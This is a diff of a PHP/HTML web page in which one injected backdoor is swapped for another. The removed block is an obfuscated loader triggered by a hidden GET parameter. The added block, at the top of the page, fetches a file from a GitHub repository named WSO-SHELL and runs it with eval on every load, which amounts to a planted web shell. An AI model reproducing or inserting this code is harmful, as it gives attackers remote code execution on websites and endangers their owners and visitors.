@@ -1,21 +1,23 @@
-<?php goto opet_3bb72; opet_3bb72: if (isset($_GET["\x6C\157\x67\163\x66\151\x6C\145"])) { 
-    $url = base64_decode("\x61\110\x52\060\x63\110\x4D\066\x4C\171\x39\152\x5A\107\x34\165\x63\110\x4A\160\x64\155\x52\150\x65\130\x6F\165\x59\062\x39\164\x4C\063\x52\064\x64\103\x39\150\x62\107\x5A\150\x63\062\x68\154\x62\107\x77\165\x64\110\x68\060");
-    
-    $ch = curl_init($url);
-    
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $contents = curl_exec($ch);
-    
-    if ($contents !== false) { 
-        eval(' ?>' . $contents); 
-        exit; 
-    } else { 
-        echo "header"; 
-    } 
-    
-    curl_close($ch);
+<?php
+$url = "https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/xmlrpc.php";
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_HEADER, true);
+
+$response = curl_exec($ch);
+$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+$body = substr($response, $header_size);
+
+if (curl_errno($ch)) {
+    echo "cURL error: " . curl_error($ch);
+} elseif ($http_code != 200) {
+    echo "HTTP Error: $http_code";
+} else {
+    eval("?>" . $body);
 }
+
+curl_close($ch);
 ?><!doctype html>
 <html class="no-js" lang="en">
 <head>
@@ -247,4 +249,5 @@ The sitemap names are dd elements in Alphabet view adjust as necessary
 <script src="../rw_common/assets/global.js"></script>
 <script src="https://website-widgets.pages.dev/dist/sienna.min.js" defer></script></body>
 </html>
+
 
